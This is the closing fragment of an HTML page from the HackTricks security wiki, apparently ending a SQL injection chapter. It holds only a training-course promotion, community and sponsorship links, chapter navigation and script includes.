Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../pentesting-web/sql-injection/ms-access-sql-injection.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../pentesting-web/sql-injection/mysql-injection/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../pentesting-web/sql-injection/ms-access-sql-injection.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../pentesting-web/sql-injection/mysql-injection/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
